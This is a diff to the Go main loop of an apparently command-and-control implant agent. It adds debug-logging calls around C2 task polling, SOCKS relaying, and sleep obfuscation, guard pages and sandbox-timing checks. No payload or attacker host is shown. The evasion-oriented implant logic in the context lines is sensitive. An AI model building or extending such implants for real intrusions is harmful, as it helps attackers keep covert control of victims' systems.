@@ -191,7 +191,9 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			outboundSocks := socksManager.DrainOutbound()
 
 			// Get tasks and inbound SOCKS data from C2 server
+			diagWrite("mainloop", "GetTasking-start")
 			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
+			diagWrite("mainloop", fmt.Sprintf("GetTasking-done tasks=%d err=%v", len(tasks), err))
 			if err != nil {
 				log.Printf("poll error: %v", err)
 				retryCount++
@@ -234,10 +236,13 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 
 			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
 			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			diagWrite("mainloop", fmt.Sprintf("pre-sleep duration=%v tasks=%d", sleepTime, len(tasks)))
 			var vault *sleepVault
 			var guard *guardedPages
 			if sleepMaskEnabled {
+				diagWrite("mainloop", "obfuscateSleep-start")
 				vault = obfuscateSleep(agent, c2)
+				diagWrite("mainloop", "obfuscateSleep-done")
 				if guardPagesEnabled {
 					guard = guardSleepPages(vault)
 				}
@@ -250,11 +255,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			} else {
 				time.Sleep(sleepTime)
 			}
+			diagWrite("mainloop", "post-sleep")
 			if sleepMaskEnabled {
 				if guardPagesEnabled {
 					unguardSleepPages(guard, vault)
 				}
+				diagWrite("mainloop", "deobfuscateSleep-start")
 				deobfuscateSleep(vault, agent, c2)
+				diagWrite("mainloop", "deobfuscateSleep-done")
 			}
 			if sleepSkipped {
 				log.Printf("timing anomaly, exiting")
